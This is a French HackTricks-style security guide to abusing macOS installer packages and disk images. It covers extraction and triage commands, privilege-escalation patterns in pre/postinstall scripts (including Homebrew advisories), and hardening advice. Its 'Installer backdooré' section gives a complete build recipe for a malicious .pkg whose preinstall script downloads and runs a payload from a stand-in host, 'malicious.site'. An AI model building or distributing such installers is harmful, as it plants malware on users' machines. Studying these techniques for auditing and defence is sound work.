# Abus des installers macOS

{{#include ../../../banners/hacktricks-training.md}}

## Informations de base sur les fichiers Pkg

Un **installer package** macOS (également connu sous le nom de fichier `.pkg`) est un format de fichier utilisé par macOS pour **distribuer des logiciels**. Ces fichiers sont comme une **boîte qui contient tout ce dont un logiciel** a besoin pour s’installer et fonctionner correctement.

Le fichier package lui-même est une archive qui contient une **hiérarchie de fichiers et de répertoires qui seront installés sur l’ordinateur** cible. Il peut également inclure des **scripts** pour effectuer des tâches avant et après l’installation, comme configurer des fichiers de configuration ou supprimer les anciennes versions du logiciel.

### Structure du package

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)** : Personnalisations (titre, texte d’accueil…) et vérifications des scripts/de l’installation
- **PackageInfo (xml)** : Informations, exigences d’installation, emplacement d’installation, chemins vers les scripts à exécuter
- **Bill of materials (bom)** : Liste des fichiers à installer, mettre à jour ou supprimer, avec leurs permissions
- **Payload (CPIO archive gzip compressed)** : Fichiers à installer dans `install-location` indiqué dans PackageInfo
- **Scripts (CPIO archive gzip compressed)** : Scripts de pré- et post-installation, ainsi que d’autres ressources extraites dans un répertoire temporaire pour être exécutées.

### Décompresser
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Pour visualiser le contenu de l’installer sans le décompresser manuellement, vous pouvez également utiliser l’outil gratuit [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Raccourcis de triage statique

Si l’objectif est l’analyse, essayez d’**éviter d’ouvrir d’abord le package avec `Installer.app`**. Certains packages peuvent exécuter du code dès qu’Installer les ouvre (par exemple via `system.run()` ou des plug-ins d’Installer), l’extraction hors ligne constitue donc généralement un point de départ plus sûr.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Informations de base sur les fichiers DMG

Les fichiers DMG, ou images disque Apple, sont un format de fichier utilisé par macOS d'Apple pour les images disque. Un fichier DMG est essentiellement une **image disque montable** (elle contient son propre système de fichiers) qui contient des données brutes de blocs, généralement compressées et parfois chiffrées. Lorsque vous ouvrez un fichier DMG, macOS le **monte comme s'il s'agissait d'un disque physique**, ce qui vous permet d'accéder à son contenu.

> [!CAUTION]
> Notez que les installateurs **`.dmg`** prennent en charge **de très nombreux formats** et que, par le passé, certains d'entre eux contenant des vulnérabilités ont été exploités pour obtenir une **exécution de code au niveau du kernel**.

### Structure d'une image disque

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

La hiérarchie d'un fichier DMG peut varier selon son contenu. Cependant, pour les DMG d'applications, elle suit généralement cette structure :

- Niveau supérieur : il s'agit de la racine de l'image disque. Elle contient souvent l'application et éventuellement un lien vers le dossier Applications.
- Application (.app) : il s'agit de l'application elle-même. Sous macOS, une application est généralement un package contenant de nombreux fichiers et dossiers individuels qui constituent l'application.
- Lien vers Applications : il s'agit d'un raccourci vers le dossier Applications sous macOS. Son objectif est de faciliter l'installation de l'application. Vous pouvez faire glisser le fichier .app vers ce raccourci pour installer l'application.

## Privesc via pkg abuse

### Exécution depuis des répertoires publics

Si un script de pré- ou post-installation exécute un fichier tel que **`/var/tmp/Installerutil`** et qu'un attacker peut remplacer ce fichier, il peut escalader ses privilèges lorsque l'installer l'invoque. Les conférences et walkthroughs citées montrent des variantes de ce modèle non sécurisé reposant sur un script externe.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Il s'agit d'une [fonction publique](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) que plusieurs installers et updaters appellent pour **exécuter quelque chose en tant que root**. Cette fonction accepte en paramètre le **path** du **fichier** à **exécuter** ; cependant, si un attacker pouvait **modifier** ce fichier, il pourrait **abuser** de son exécution avec les privilèges root afin d'**escalader ses privilèges**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Pour plus d’informations, consultez cette présentation : [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Abus de l’environnement et des shebangs

Les vulnérabilités modernes de PackageKit ont montré que les scripts d’installation sont souvent exécutés en tant que **code root de confiance**, tout en conservant à proximité un contexte contrôlé par l’attaquant. Lors de l’audit de packages de fournisseurs, accordez une attention particulière aux éléments suivants :

- Interpréteurs shell tels que `#!/bin/zsh` / `#!/bin/bash`
- Appels tels que `sudo -u $USER`, `launchctl asuser`, ou toute logique qui fait confiance à `$USER`, `$HOME`, `PATH`, `TMPDIR` ou aux chemins relatifs
- Interpréteurs non-shell susceptibles de charger des fichiers d’initialisation ou des bibliothèques contrôlés par l’utilisateur
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Pour le bug de l’environnement root de PackageKit de 2024 (héritage de `~/.zshenv` / `~/.bash*` lors des installations lancées par l’utilisateur), consultez [la page générique sur la privesc macOS](../macos-privilege-escalation.md). Si le package est **signé par Apple**, le même bug de script peut devenir pertinent pour **SIP/TCC**, car `system_installd` peut porter `com.apple.rootless.install.heritable` ; voir [la page SIP](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Entrées avec état et callbacks implicites

Ne limitez pas l’analyse à l’injection de commandes évidente. Un `preinstall`/`postinstall` root peut franchir une frontière de confiance dès qu’il consomme un **état existant avant l’installation** : fichiers prévisibles dans `/tmp` ou `/var/tmp`, arborescence d’installation existante accessible en écriture par l’utilisateur, fichiers de configuration, métadonnées de repository ou nom d’utilisateur ensuite transmis à `chown`.<sup>[[9]](#references)[[10]](#references)</sup>

Deux vulnérabilités récentes des installateurs Homebrew illustrent des variantes réutilisables :

- **Ownership sélectionné par l’attaquant :** une surcharge de l’utilisateur du package était lue depuis le fichier prévisible `/var/tmp/.homebrew_pkg_user.plist` sans valider son propriétaire, son mode, ses ACL, son état de symlink ou sa provenance. Un utilisateur faiblement privilégié pouvait sélectionner son propre compte, puis un `postinstall` root ultérieur transférait récursivement l’ownership de l’arborescence et du cache Homebrew vers ce compte. Il s’agissait d’une vulnérabilité d’attribution de privilèges, et non d’une injection shell.<sup>[[9]](#references)</sup>
- **Callbacks d’outils depuis une arborescence existante :** un `postinstall` root exécutait `git checkout` dans une installation qui était volontairement accessible en écriture par son utilisateur normal. Placer un `.git/hooks/post-checkout` exécutable transformait donc une mise à niveau ultérieure du package via GUI/MDM en exécution de code root. Sur le chemin Intel, la fusion du répertoire `.git` fourni avec le repository existant conservait également les hooks ajoutés par l’attaquant.<sup>[[10]](#references)</sup>

Le deuxième primitive est facile à modéliser lors d’un test autorisé ; le déclenchement ne se produit que lorsque l’installer privilégié vulnérable exécute ensuite une opération Git capable de lancer des hooks.<sup>[[10]](#references)</sup>
```bash
repo=/path/to/user-writable/install
mkdir -p "$repo/.git/hooks"
cat > "$repo/.git/hooks/post-checkout" <<'EOF'
#!/bin/sh
id > /tmp/pkg-post-checkout-context
EOF
chmod +x "$repo/.git/hooks/post-checkout"
# Wait for the privileged .pkg install/upgrade; do not invoke it as root just to test.
```
Développez les packages imbriqués et cartographiez chaque source contrôlée par l’attaquant vers un sink privilégié. En plus de l’exécution directe, recherchez les parseurs, les changements de propriété et les outils dotés de mécanismes de plug-in/hook.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
PKG=Target.pkg
OUT=$(mktemp -d)
pkgutil --expand-full "$PKG" "$OUT"
grep -RniE '(/var/tmp|/tmp|defaults[[:space:]]+read|PlistBuddy|chown[[:space:]]+-R)' "$OUT"
grep -RniE '(^|[;&|[:space:]])(git|svn|hg|npm|pip|ruby|python)[[:space:]]' "$OUT"
grep -RniE '(checkout|reset|submodule|hooksPath|GIT_(DIR|CONFIG)|PYTHONPATH|RUBYOPT)' "$OUT"
```
Pour le hardening, déplacez les entrées privilégiées dans un répertoire de staging appartenant à root et validez chaque chemin immédiatement avant son utilisation (fichier régulier, propriétaire/mode attendus, aucune ACL non sécurisée et absence de traversée de symlink). Évitez de modifier récursivement la propriété depuis une identité non approuvée. Lorsque Git doit s’exécuter sur une arborescence préexistante, désactivez explicitement les callbacks (par exemple, `git -c core.hooksPath=/dev/null ...`) ou remplacez atomiquement les métadonnées du repository avant d’invoquer Git.<sup>[[9]](#references)[[10]](#references)</sup>

### Exécution par montage

Si un installer écrit dans `/tmp/fixedname/bla/bla`, il est possible de **créer un mount** sur `/tmp/fixedname` avec `noowners`, ce qui permettrait de **modifier n’importe quel fichier pendant l’installation** afin d’abuser du processus d’installation.

Un exemple est **CVE-2021-26089**, qui a permis **d’écraser un script périodique** pour obtenir une exécution en tant que root. Pour plus d’informations, consultez la présentation : [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg comme malware

### Payload vide

Il est possible de générer simplement un fichier **`.pkg`** contenant des **scripts pre et post-install** sans aucun véritable payload, en dehors du malware présent dans les scripts.<sup>[[2]](#references)</sup>

### JS dans le fichier XML Distribution

Il est possible d’ajouter des balises **`<script>`** dans le fichier **distribution xml** du package. Ce code sera alors exécuté et pourra **exécuter des commandes** à l’aide de **`system.run`** :

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Dans les packages Distribution, cela dépend généralement du fichier `Distribution` de niveau supérieur, qui doit autoriser les scripts externes, par exemple avec `allow-external-scripts="true"`. Par conséquent, examiner uniquement `preinstall` / `postinstall` ne suffit pas : le **Distribution XML lui-même** peut contenir des hooks `installation-check` / `volume-check` ainsi que des chemins d’exécution directs via `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Installer backdooré

Installateur malveillant utilisant un script et du code JS à l’intérieur de dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Dépaquetage des PKG : un regard à l'intérieur des packages d'installation macOS et de leurs failles de sécurité courantes](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0 : « Le monde sauvage des installateurs macOS » - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Dépaquetage des PKG : un regard à l'intérieur des packages d'installation MacOS](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – Red Teaming macOS : exploitation des packages d'installation](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822 : élévation de privilèges via macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Contourner SIP avec des packages signés par Apple](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0 : « Mount(ain) of Bugs » - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - La mort par 1 000 installateurs sur macOS, et tout est cassé !](https://www.youtube.com/watch?v=lTOItyjTTkw)
- [9] [L'installateur macOS Homebrew fait confiance à un plist package-user contrôlé par l'utilisateur](https://github.com/Homebrew/brew/security/advisories/GHSA-59v8-x8q4-px5c)
- [10] [Exécution de code root via des Git hooks dans un postinstall PKG macOS](https://github.com/Homebrew/brew/security/advisories/GHSA-6689-q779-c33m)
{{#include ../../../banners/hacktricks-training.md}}
